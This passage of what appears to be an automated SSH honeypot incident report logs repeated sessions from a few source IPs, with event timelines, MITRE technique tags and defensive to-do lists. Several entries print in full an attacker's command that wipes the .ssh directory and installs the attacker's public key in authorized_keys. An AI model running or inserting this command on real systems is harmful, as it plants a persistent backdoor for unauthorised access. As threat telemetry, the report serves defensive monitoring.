| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:21:58` | `cowrie.session.connect` |
| `2026-04-09 17:21:58` | `cowrie.client.version` |
| `2026-04-09 17:21:58` | `cowrie.client.kex` |
| `2026-04-09 17:21:59` | `cowrie.login.success` |
| `2026-04-09 17:21:59` | `cowrie.session.params` |
| `2026-04-09 17:21:59` | `cowrie.command.input` |
| `2026-04-09 17:21:59` | `cowrie.command.failed` |
| `2026-04-09 17:22:00` | `cowrie.log.closed` |
| `2026-04-09 17:22:01` | `cowrie.session.params` |
| `2026-04-09 17:22:01` | `cowrie.command.input` |
| `2026-04-09 17:22:01` | `cowrie.session.file_download` |
| `2026-04-09 17:22:01` | `cowrie.log.closed` |
| `2026-04-09 17:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38b14bb1c4bd

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 17:22 |
| **Last Seen** | 2026-04-09 17:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:22:05` | `cowrie.session.connect` |
| `2026-04-09 17:22:05` | `cowrie.client.version` |
| `2026-04-09 17:22:05` | `cowrie.client.kex` |
| `2026-04-09 17:22:09` | `cowrie.login.success` |
| `2026-04-09 17:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98a72c1c4faf

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:23 |
| **Last Seen** | 2026-04-09 17:23 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:23:04` | `cowrie.session.connect` |
| `2026-04-09 17:23:04` | `cowrie.client.version` |
| `2026-04-09 17:23:05` | `cowrie.client.kex` |
| `2026-04-09 17:23:06` | `cowrie.login.success` |
| `2026-04-09 17:23:07` | `cowrie.session.params` |
| `2026-04-09 17:23:07` | `cowrie.command.input` |
| `2026-04-09 17:23:07` | `cowrie.command.failed` |
| `2026-04-09 17:23:08` | `cowrie.log.closed` |
| `2026-04-09 17:23:09` | `cowrie.session.params` |
| `2026-04-09 17:23:09` | `cowrie.command.input` |
| `2026-04-09 17:23:09` | `cowrie.session.file_download` |
| `2026-04-09 17:23:09` | `cowrie.log.closed` |
| `2026-04-09 17:23:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d40733685d5

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:23 |
| **Last Seen** | 2026-04-09 17:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:23:13` | `cowrie.session.connect` |
| `2026-04-09 17:23:13` | `cowrie.client.version` |
| `2026-04-09 17:23:14` | `cowrie.client.kex` |
| `2026-04-09 17:23:15` | `cowrie.login.success` |
| `2026-04-09 17:23:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c089dc34e00

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 17:28 |
| **Last Seen** | 2026-04-09 17:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:28:24` | `cowrie.session.connect` |
| `2026-04-09 17:28:24` | `cowrie.client.version` |
| `2026-04-09 17:28:24` | `cowrie.client.kex` |
| `2026-04-09 17:28:25` | `cowrie.login.success` |
| `2026-04-09 17:28:25` | `cowrie.session.params` |
| `2026-04-09 17:28:25` | `cowrie.command.input` |
| `2026-04-09 17:28:25` | `cowrie.command.failed` |
| `2026-04-09 17:28:25` | `cowrie.log.closed` |
| `2026-04-09 17:28:26` | `cowrie.session.params` |
| `2026-04-09 17:28:26` | `cowrie.command.input` |
| `2026-04-09 17:28:27` | `cowrie.session.file_download` |
| `2026-04-09 17:28:27` | `cowrie.log.closed` |
| `2026-04-09 17:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9289a8ae64cf

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 17:28 |
| **Last Seen** | 2026-04-09 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:28:29` | `cowrie.session.connect` |
| `2026-04-09 17:28:29` | `cowrie.client.version` |
| `2026-04-09 17:28:29` | `cowrie.client.kex` |
| `2026-04-09 17:28:30` | `cowrie.login.success` |
| `2026-04-09 17:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8055fa74b972

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 17:31 |
| **Last Seen** | 2026-04-09 17:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:31:41` | `cowrie.session.connect` |
| `2026-04-09 17:31:41` | `cowrie.client.version` |
| `2026-04-09 17:31:42` | `cowrie.client.kex` |
| `2026-04-09 17:31:43` | `cowrie.login.success` |
| `2026-04-09 17:31:43` | `cowrie.session.params` |
| `2026-04-09 17:31:43` | `cowrie.command.input` |
| `2026-04-09 17:31:43` | `cowrie.command.failed` |
| `2026-04-09 17:31:43` | `cowrie.log.closed` |
| `2026-04-09 17:31:44` | `cowrie.session.params` |
| `2026-04-09 17:31:44` | `cowrie.command.input` |
| `2026-04-09 17:31:45` | `cowrie.session.file_download` |
| `2026-04-09 17:31:45` | `cowrie.log.closed` |
| `2026-04-09 17:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e26d574bab6c

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 17:31 |
| **Last Seen** | 2026-04-09 17:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:31:48` | `cowrie.session.connect` |
| `2026-04-09 17:31:48` | `cowrie.client.version` |
| `2026-04-09 17:31:48` | `cowrie.client.kex` |
| `2026-04-09 17:31:49` | `cowrie.login.success` |
| `2026-04-09 17:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03661ca5b51a

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:34 |
| **Last Seen** | 2026-04-09 17:34 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:34:06` | `cowrie.session.connect` |
| `2026-04-09 17:34:06` | `cowrie.client.version` |
| `2026-04-09 17:34:07` | `cowrie.client.kex` |
| `2026-04-09 17:34:08` | `cowrie.login.success` |
| `2026-04-09 17:34:09` | `cowrie.session.params` |
| `2026-04-09 17:34:09` | `cowrie.command.input` |
| `2026-04-09 17:34:09` | `cowrie.command.failed` |
| `2026-04-09 17:34:09` | `cowrie.log.closed` |
| `2026-04-09 17:34:10` | `cowrie.session.params` |
| `2026-04-09 17:34:10` | `cowrie.command.input` |
| `2026-04-09 17:34:11` | `cowrie.session.file_download` |
| `2026-04-09 17:34:11` | `cowrie.log.closed` |
| `2026-04-09 17:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-386ab3f2a392

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:34 |
| **Last Seen** | 2026-04-09 17:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:34:15` | `cowrie.session.connect` |
| `2026-04-09 17:34:15` | `cowrie.client.version` |
| `2026-04-09 17:34:15` | `cowrie.client.kex` |
| `2026-04-09 17:34:17` | `cowrie.login.success` |
| `2026-04-09 17:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6f913abb0d0

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 17:38 |
| **Last Seen** | 2026-04-09 17:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:38:12` | `cowrie.session.connect` |
| `2026-04-09 17:38:12` | `cowrie.client.version` |
| `2026-04-09 17:38:12` | `cowrie.client.kex` |
| `2026-04-09 17:38:13` | `cowrie.login.success` |
| `2026-04-09 17:38:13` | `cowrie.session.params` |
| `2026-04-09 17:38:13` | `cowrie.command.input` |
| `2026-04-09 17:38:13` | `cowrie.command.failed` |
| `2026-04-09 17:38:13` | `cowrie.log.closed` |
| `2026-04-09 17:38:14` | `cowrie.session.params` |
| `2026-04-09 17:38:14` | `cowrie.command.input` |
| `2026-04-09 17:38:14` | `cowrie.session.file_download` |
| `2026-04-09 17:38:14` | `cowrie.log.closed` |
| `2026-04-09 17:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ebf7ca749b

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 17:38 |
| **Last Seen** | 2026-04-09 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:38:17` | `cowrie.session.connect` |
| `2026-04-09 17:38:17` | `cowrie.client.version` |
| `2026-04-09 17:38:17` | `cowrie.client.kex` |
| `2026-04-09 17:38:18` | `cowrie.login.success` |
| `2026-04-09 17:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1823f3cc8bbd

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:41 |
| **Last Seen** | 2026-04-09 17:41 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:41:17` | `cowrie.session.connect` |
| `2026-04-09 17:41:17` | `cowrie.client.version` |
| `2026-04-09 17:41:18` | `cowrie.client.kex` |
| `2026-04-09 17:41:19` | `cowrie.login.success` |
| `2026-04-09 17:41:20` | `cowrie.session.params` |
| `2026-04-09 17:41:20` | `cowrie.command.input` |
| `2026-04-09 17:41:20` | `cowrie.command.failed` |
| `2026-04-09 17:41:21` | `cowrie.log.closed` |
| `2026-04-09 17:41:22` | `cowrie.session.params` |
| `2026-04-09 17:41:22` | `cowrie.command.input` |
| `2026-04-09 17:41:22` | `cowrie.session.file_download` |
| `2026-04-09 17:41:22` | `cowrie.log.closed` |
| `2026-04-09 17:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47b0259ba3ea

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:41 |
| **Last Seen** | 2026-04-09 17:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:41:27` | `cowrie.session.connect` |
| `2026-04-09 17:41:27` | `cowrie.client.version` |
| `2026-04-09 17:41:27` | `cowrie.client.kex` |
| `2026-04-09 17:41:29` | `cowrie.login.success` |
| `2026-04-09 17:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3904fb35219

| Field | Detail |
|---|---|
| **Source IP** | `128.1.47[.]28` |
| **First Seen** | 2026-04-09 17:41 |
| **Last Seen** | 2026-04-09 17:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:41:38` | `cowrie.session.connect` |
| `2026-04-09 17:41:38` | `cowrie.client.version` |
| `2026-04-09 17:41:38` | `cowrie.client.kex` |
| `2026-04-09 17:41:39` | `cowrie.login.success` |
| `2026-04-09 17:41:39` | `cowrie.session.params` |
| `2026-04-09 17:41:39` | `cowrie.command.input` |
| `2026-04-09 17:41:39` | `cowrie.command.failed` |
| `2026-04-09 17:41:39` | `cowrie.log.closed` |
| `2026-04-09 17:41:40` | `cowrie.session.params` |
| `2026-04-09 17:41:40` | `cowrie.command.input` |
| `2026-04-09 17:41:40` | `cowrie.session.file_download` |
| `2026-04-09 17:41:40` | `cowrie.log.closed` |
| `2026-04-09 17:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.1.47[.]28` to AbuseIPDB if not already reported
- [ ] Block `128.1.47[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66fe58097b82

| Field | Detail |
|---|---|
| **Source IP** | `128.1.47[.]28` |
| **First Seen** | 2026-04-09 17:41 |
| **Last Seen** | 2026-04-09 17:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:41:43` | `cowrie.session.connect` |
| `2026-04-09 17:41:43` | `cowrie.client.version` |
| `2026-04-09 17:41:43` | `cowrie.client.kex` |
| `2026-04-09 17:41:44` | `cowrie.login.success` |
| `2026-04-09 17:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.1.47[.]28` to AbuseIPDB if not already reported
- [ ] Block `128.1.47[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-435b23cdb482

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:44 |
| **Last Seen** | 2026-04-09 17:45 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:44:59` | `cowrie.session.connect` |
| `2026-04-09 17:44:59` | `cowrie.client.version` |
| `2026-04-09 17:44:59` | `cowrie.client.kex` |
| `2026-04-09 17:45:01` | `cowrie.login.success` |
| `2026-04-09 17:45:02` | `cowrie.session.params` |
| `2026-04-09 17:45:02` | `cowrie.command.input` |
